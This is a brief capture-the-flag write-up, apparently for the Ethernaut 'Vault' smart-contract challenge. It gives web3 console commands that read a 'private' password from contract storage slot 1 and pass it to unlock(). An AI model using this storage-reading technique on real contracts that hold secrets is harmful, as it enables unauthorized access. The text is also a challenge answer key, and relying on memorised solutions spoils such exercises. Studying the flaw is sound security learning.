#Vault

Since we know the contract structure and we know how the EVM stores variables, we know that
the bool is stored in slot 0 and the bytes32 is stored in slot 1. We can access this variable through:

> await web3.eth.getStorageAt(contract.address, 1)

We take this bytes32 password and pass it through to the unlock function

> await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')

We can check that it worked

> await contract.locked()
